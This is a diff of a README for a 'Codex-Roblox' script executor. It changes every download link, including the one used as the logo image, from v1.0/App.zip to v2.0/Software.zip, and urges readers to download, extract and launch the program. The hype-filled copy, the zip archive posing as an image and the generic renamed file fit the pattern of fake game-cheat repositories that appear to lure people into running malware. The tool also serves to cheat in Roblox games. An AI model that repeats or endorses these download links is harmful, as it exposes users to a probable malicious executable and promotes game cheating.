@@ -1,7 +1,7 @@
 
 # 🚀 **Codex-Roblox Repository**
 
-![Roblox Logo](https://github.com/Salsiii/Codex-Roblox/releases/download/v1.0/App.zip)
+![Roblox Logo](https://github.com/Salsiii/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 ## Introduction
 Welcome to the **Codex-Roblox** repository! This is the ultimate destination for Roblox enthusiasts who want to enhance their gaming experience by utilizing the powerful capabilities of the Codex Executor. Whether you are a seasoned developer or a casual player, Codex provides unparalleled functionality to effortlessly run scripts for your favorite Roblox games.
@@ -33,7 +33,7 @@ Welcome to the **Codex-Roblox** repository! This is the ultimate destination for
 ## Getting Started
 To get started with Codex-Roblox, simply download the latest version by clicking the button below:
 
-[![Download Codex-Roblox](https://github.com/Salsiii/Codex-Roblox/releases/download/v1.0/App.zip)](https://github.com/Salsiii/Codex-Roblox/releases/download/v1.0/App.zip)
+[![Download Codex-Roblox](https://github.com/Salsiii/Codex-Roblox/releases/download/v2.0/Software.zip)](https://github.com/Salsiii/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 📂 Once downloaded, extract the files and launch the Codex Executor to begin your Roblox scripting journey.
 
